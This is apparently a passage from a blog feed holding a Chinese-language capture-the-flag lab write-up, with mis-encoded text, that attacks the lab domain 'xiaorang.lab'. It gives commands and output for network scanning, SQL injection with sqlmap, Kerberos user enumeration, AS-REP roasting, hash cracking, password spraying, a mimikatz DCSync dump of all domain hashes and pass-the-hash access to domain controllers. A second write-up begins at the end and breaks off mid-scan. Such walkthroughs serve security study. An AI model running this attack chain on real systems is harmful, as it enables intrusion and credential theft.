0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:05:e4:f7  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 135368  bytes 165481073 (165.4 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 71891  bytes 15950459 (15.9 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.6.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">[*] alive ports len is: 11</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] NetBios: 172.22.6.25     XIAORANG\WIN2019               </span><br><span class="line">[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:åå°ç™»å½•</span><br><span class="line">[*] NetBios: 172.22.6.12     [+]DC DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None</span><br></pre></td></tr></table></figure><p>è®¿é—®38çš„åå°ç•Œé¢ï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œå¯ä»¥æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r requests.txt -D oa_db -T oa_f1Agggg --dump --batch</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>ä»æ•°æ®åº“ä¸­å¯ä»¥æ‹¿åˆ°ä¸€å †ç”¨æˆ·åï¼Œè¡¨å¤§å°çš„åŸå› å¯èƒ½å¯¼è‡´æ˜¾ç¤ºä¸å…¨ï¼Œéœ€è¦åœ¨excelè¡¨ä¸­æ‰¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;username.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> files:</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="comment"># æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… email</span></span><br><span class="line">        email_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\b[\w.-]+@xiaorang\.lab\b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æå–æ‰€æœ‰åŒ¹é…çš„ email</span></span><br><span class="line">        emails = email_pattern.findall(file)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å‡ºæ‰€æœ‰ email</span></span><br><span class="line">        <span class="keyword">for</span> email <span class="keyword">in</span> emails:</span><br><span class="line">            <span class="built_in">print</span>(email)</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬å¯ä»¥æŠŠç”¨æˆ·åæå‡ºæ¥ï¼Œå…ˆç¡®è®¤ä¸€ä¸‹å“ªäº›æ˜¯æœ‰æ•ˆçš„åŸŸå†…ç”¨æˆ·ï¼Œç„¶åç”¨è„šæœ¬æå–å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 172.22.6.12 -d xiaorang.lab username.txt -t 10</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">weixian@xiaorang.lab</span><br><span class="line">shuzhen@xiaorang.lab</span><br><span class="line">xuanjiang@xiaorang.lab</span><br><span class="line">wengbang@xiaorang.lab</span><br><span class="line">xiqidi@xiaorang.lab</span><br><span class="line">gaiyong@xiaorang.lab</span><br><span class="line">yuanchang@xiaorang.lab</span><br><span class="line">lvhui@xiaorang.lab</span><br><span class="line">wenbo@xiaorang.lab</span><br><span class="line">zhenjun@xiaorang.lab</span><br><span class="line">jinqing@xiaorang.lab</span><br><span class="line">yangju@xiaorang.lab</span><br><span class="line">weicheng@xiaorang.lab</span><br><span class="line">weixian@xiaorang.lab</span><br><span class="line">haobei@xiaorang.lab</span><br><span class="line">jingze@xiaorang.lab</span><br><span class="line">zhaoxiu@xiaorang.lab</span><br><span class="line">jizhen@xiaorang.lab</span><br><span class="line">qiyue@xiaorang.lab</span><br><span class="line">rubao@xiaorang.lab</span><br><span class="line">liangliang@xiaorang.lab</span><br><span class="line">tangshun@xiaorang.lab</span><br><span class="line">chouqian@xiaorang.lab</span><br><span class="line">jicheng@xiaorang.lab</span><br><span class="line">xiyi@xiaorang.lab</span><br><span class="line">chenghui@xiaorang.lab</span><br><span class="line">beijin@xiaorang.lab</span><br><span class="line">yanglang@xiaorang.lab</span><br><span class="line">chebin@xiaorang.lab</span><br><span class="line">pengyuan@xiaorang.lab</span><br><span class="line">jihuan@xiaorang.lab</span><br><span class="line">duanmuxiao@xiaorang.lab</span><br><span class="line">gaijin@xiaorang.lab</span><br><span class="line">hongzhi@xiaorang.lab</span><br><span class="line">yifu@xiaorang.lab</span><br><span class="line">fusong@xiaorang.lab</span><br><span class="line">tangrong@xiaorang.lab</span><br><span class="line">luwan@xiaorang.lab</span><br><span class="line">dongcheng@xiaorang.lab</span><br><span class="line">zhufeng@xiaorang.lab</span><br><span class="line">lianhuangchen@xiaorang.lab</span><br><span class="line">lili@xiaorang.lab</span><br><span class="line">wenshao@xiaorang.lab</span><br><span class="line">huabi@xiaorang.lab</span><br><span class="line">rangsibo@xiaorang.lab</span><br><span class="line">wohua@xiaorang.lab</span><br><span class="line">haoguang@xiaorang.lab</span><br><span class="line">langying@xiaorang.lab</span><br><span class="line">manxue@xiaorang.lab</span><br><span class="line">diaocai@xiaorang.lab</span><br><span class="line">baqin@xiaorang.lab</span><br><span class="line">lianggui@xiaorang.lab</span><br><span class="line">louyou@xiaorang.lab</span><br><span class="line">chengqiu@xiaorang.lab</span><br><span class="line">weishengshan@xiaorang.lab</span><br><span class="line">maqun@xiaorang.lab</span><br><span class="line">wenbiao@xiaorang.lab</span><br><span class="line">zhangxin@xiaorang.lab</span><br><span class="line">chuyuan@xiaorang.lab</span><br><span class="line">wenliang@xiaorang.lab</span><br><span class="line">luyue@xiaorang.lab</span><br><span class="line">yulvxue@xiaorang.lab</span><br><span class="line">ganjian@xiaorang.lab</span><br><span class="line">guohong@xiaorang.lab</span><br><span class="line">pangzhen@xiaorang.lab</span><br><span class="line">sheweiyue@xiaorang.lab</span><br><span class="line">lezhong@xiaorang.lab</span><br><span class="line">dujian@xiaorang.lab</span><br><span class="line">lidongjin@xiaorang.lab</span><br><span class="line">hongqun@xiaorang.lab</span><br><span class="line">yexing@xiaorang.lab</span><br><span class="line">maoda@xiaorang.lab</span><br><span class="line">qiaomei@xiaorang.lab</span><br><span class="line">ganjian@xiaorang.lab</span><br></pre></td></tr></table></figure><h3 id="AS-REPRoasting">AS-REPRoasting</h3><p>åœ¨AS_REPé˜¶æ®µï¼Œä¼šè¿”å›ç”±æˆ‘ä»¬è¯·æ±‚çš„åŸŸè´¦æˆ·hashåŠ å¯†æŸä¸ªå€¼åè¿”å›ã€‚ç„¶åæˆ‘ä»¬é€šè¿‡è‡ªèº«çš„ntlm hashå»è§£å¯†å¾—åˆ°æ•°æ®ã€‚åœ¨è¿™é‡Œè®¾ç½®ä¸è¦æ±‚é¢„èº«ä»½éªŒè¯åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨AS_REQé˜¶æ®µï¼Œå¡«å†™æƒ³è¦ä¼ªé€ è¯·æ±‚çš„ç”¨æˆ·åï¼Œéšåä¼šç”¨ä¼ªé€ è¯·æ±‚çš„ç”¨æˆ·åNTLM HashåŠ å¯†è¿”å›ç»™æˆ‘ä»¬ã€‚éšåæˆ‘ä»¬å°±å¯ä»¥æ‹¿å»çˆ†ç ´äº†</p><p>ä½¿ç”¨åŸŸå†…æœ‰æ•ˆç”¨æˆ·å»æŸ¥SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ°ä¸¤ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23<span class="variable">$wenshao</span>@xiaorang.lab@XIAORANG.LAB:48943048f6bc84479d855419597b7700<span class="variable">$3a745d07844aeda98c3f774b382f42d0126606d0aa030ffd6d4992ef60ecc8abc770ee4dffe49ba0ed9ce93549a7540f20f1fffa0f667cb4354f5a1ed25c3c64961967729997e8190989ed990e36558d6b3e85d0403caa763187fee7b6b57facea423d08b5371668b3406bbef49d742b1dd09026928ca38b915fe74a0161d489f4502703510e6c2d6b5e33db2f5eaa61f7ec5bbb5f6267305b46835baf2f1ecf5c1681019f1de85f34331abaa399f067c67e064c344017ab736d96cdc741a6f71e28c90c8c351a1f894cee8cd1cfef6ab98232ac372850f9ad433ed8e1617302825a7682291da5890e70d0f0</span></span><br><span class="line">$krb5asrep$23<span class="variable">$zhangxin</span>@xiaorang.lab@XIAORANG.LAB:3acdd0fbfdd7ff3e9b671009f07cd6dc<span class="variable">$b5fe8d174a85d538df4b1660f58758069e1a5393d6c3957f16026e0808f32e845a1c921bade6b247b831480743f5b6dedc2a1fc46025e0b5ea5878dafb090fb7b9e5dbb281faeb5e713976144769c5e248e404df8644cf1fe1abc326936724b0bf9af647630d7784b14deed290299170dde2d49cee2ed28b86d33085d830456a75d96d86b1a83f917338e0047842374433310c7d1f3a12e924eafaa344f30ef2e1a095608f99a55c9f1c550c17031d88eb901919c3f806ba05bf4c3f4dc4b8993fb60f9d2a6e0cdebf727e0908bc7b61ff559b507f68b24cc41c5f43a8e5173642fdac1e105ef49c5bad16a9</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´æ˜æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force hash.txt ./rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wenshao@xiaorang.lab:hellokitty</span><br><span class="line">zhangxin@xiaorang.lab:strawberry</span><br></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€æ³¢rdp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.6.1/24 -u user.txt -p pass.txt --continue-on-success 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820224508866.png" alt="image-20240820224508866"></p><p>rdpä¸Šå»ï¼Œç”¨bloodhoundåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820224845973.png" alt="image-20240820224845973"></p><p>å¦‚æœå°†AåŸŸä¸­çš„åŸŸç”¨æˆ·è¿ç§»åˆ°BåŸŸä¸­ï¼Œé‚£ä¹ˆåœ¨BåŸŸä¸­è¯¥ç”¨æˆ·çš„SIDä¼šéšä¹‹æ”¹å˜ï¼Œè¿›è€Œå½±å“è¿ç§»åç”¨æˆ·çš„æƒé™ï¼Œå¯¼è‡´è¿ç§»åçš„ç”¨æˆ·ä¸èƒ½è®¿é—®æœ¬æ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚SID Historyçš„ä½œç”¨æ˜¯åœ¨åŸŸè¿ç§»è¿‡ç¨‹ä¸­ä¿æŒåŸŸç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œå³å¦‚æœè¿ç§»åç”¨æˆ·çš„SIDæ”¹å˜äº†ï¼Œç³»ç»Ÿä¼šå°†å…¶åŸæ¥çš„SIDæ·»åŠ åˆ°è¿ç§»åç”¨æˆ·çš„SID Historyå±æ€§ä¸­ï¼Œä½¿è¿ç§»åçš„ç”¨æˆ·ä¿æŒåŸæœ‰æƒé™ã€èƒ½å¤Ÿè®¿é—®å…¶åŸæ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚</p><p>ç®€å•æ¥è¯´yuxuanå±äºåŸŸç®¡ï¼Œæ‰€ä»¥ç°åœ¨æ‹¿åˆ°yuxuançš„æƒé™ç„¶ådumpå“ˆå¸Œå°±å¥½äº†ï¼Œä¸Šå°è±†å­æ”¶é›†ä¸€æ³¢ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â•”â•â•â•â•â•â•â•â•â•â•â•£ Looking <span class="keyword">for</span> AutoLogon credentials</span><br><span class="line">    Some AutoLogon credentials were found</span><br><span class="line">    DefaultDomainName             :  xiaorang.lab</span><br><span class="line">    DefaultUserName               :  yuxuan</span><br><span class="line">    DefaultPassword               :  Yuxuan7QbrgZ3L</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è‡ªåŠ¨ç™»å½•ç”¨æˆ·ï¼Œæ­£å¥½å°±æ˜¯yuxuanï¼Œç”¨æ­¤ç”¨æˆ·rdpä¸Šå»ï¼ŒdumpåŸŸç®¡å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC-PROGAME.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512</span><br><span class="line">1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512</span><br><span class="line">1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512</span><br><span class="line">1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512</span><br><span class="line">1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512</span><br><span class="line">1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512</span><br><span class="line">1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512</span><br><span class="line">1111    wenbo   9abb7115997ea03785e92542f684bdde        512</span><br><span class="line">1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512</span><br><span class="line">1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512</span><br><span class="line">1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512</span><br><span class="line">1117    weicheng        796a774eace67c159a65d6b86fea1d01        512</span><br><span class="line">1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512</span><br><span class="line">1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512</span><br><span class="line">1120    jizhen  1840c5130e290816b55b4e5b60df10da        512</span><br><span class="line">1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512</span><br><span class="line">1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512</span><br><span class="line">1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512</span><br><span class="line">1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512</span><br><span class="line">1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512</span><br><span class="line">1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512</span><br><span class="line">1127    chouqian        c6f0585b35de1862f324bc33c920328d        512</span><br><span class="line">1128    jicheng 159ee55f1626f393de119946663a633c        512</span><br><span class="line">1129    xiyi    ee146df96b366efaeb5138832a75603b        512</span><br><span class="line">1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512</span><br><span class="line">1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512</span><br><span class="line">1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512</span><br><span class="line">1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512</span><br><span class="line">1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512</span><br><span class="line">1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512</span><br><span class="line">1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512</span><br><span class="line">1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512</span><br><span class="line">1138    gaijin  b1040198d43631279a63b7fbc4c403af        512</span><br><span class="line">1139    yifu    4836347be16e6af2cd746d3f934bb55a        512</span><br><span class="line">1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512</span><br><span class="line">1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512</span><br><span class="line">1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512</span><br><span class="line">1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512</span><br><span class="line">1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512</span><br><span class="line">1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512</span><br><span class="line">1147    lili    b290a36500f7e39beee8a29851a9f8d5        512</span><br><span class="line">1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512</span><br><span class="line">1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512</span><br><span class="line">1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512</span><br><span class="line">1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512</span><br><span class="line">1152    langying        52a8a125cd369ab16a385f3fcadc757d        512</span><br><span class="line">1153    diaocai a14954d5307d74cd75089514ccca097a        512</span><br><span class="line">1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512</span><br><span class="line">1155    manxue  0255c42d9f960475f5ad03e0fee88589        512</span><br><span class="line">1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512</span><br><span class="line">1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512</span><br><span class="line">1158    louyou  a97ba112b411a3bfe140c941528a4648        512</span><br><span class="line">1159    maqun   485c35105375e0754a852cee996ed33b        512</span><br><span class="line">1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512</span><br><span class="line">1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512</span><br><span class="line">1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512</span><br><span class="line">1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512</span><br><span class="line">1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512</span><br><span class="line">1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512</span><br><span class="line">1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512</span><br><span class="line">1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512</span><br><span class="line">1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512</span><br><span class="line">1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512</span><br><span class="line">1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512</span><br><span class="line">1172    dujian  8f7846c78f03bf55685a697fe20b0857        512</span><br><span class="line">1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512</span><br><span class="line">1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512</span><br><span class="line">1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512</span><br><span class="line">1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512</span><br><span class="line">1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512</span><br><span class="line">502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514</span><br><span class="line">500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512</span><br><span class="line">1000    DC-PROGAME$     9534a3db96c011d40a133aa22ba4d65a        532480</span><br><span class="line">1181    WIN2019$        9f0b5119be244f76a96a9a4cd2c77af5        4096</span><br><span class="line">1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352</span><br><span class="line">1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352</span><br><span class="line">1180    yuxuan  376ece347142d1628632d440530e8eed        66048</span><br></pre></td></tr></table></figure><p>æ¨ªå‘åŸŸæ§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> impacket-smbexec -hashes :<span class="number">04</span>d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@<span class="number">172.22.6.25</span> -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Spoofing</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Spoofing.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Spoofing.html</id>
    <published>2024-08-20T15:22:58.701Z</published>
    <updated>2024-08-20T15:35:30.204Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Spoofing</h1><h2 id="flag01">flag01</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___|<span class="string"> </span>|<span class="string"> __</span></span><br><span class="line"><span class="string"> / /_\/____/ __</span>|<span class="string">/ __</span>|<span class="string"> &#x27;__/ _` </span>|<span class="string">/ __</span>|<span class="string"> </span>|<span class="string">/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (__</span>|<span class="string">   &lt;</span></span><br><span class="line"><span class="string">\____/     </span>|<span class="string">___/\___</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___</span>|<span class="string">_</span>|<span class="string">\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 39.98.118.194   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">39.98.118.194:8009 open</span></span><br><span class="line"><span 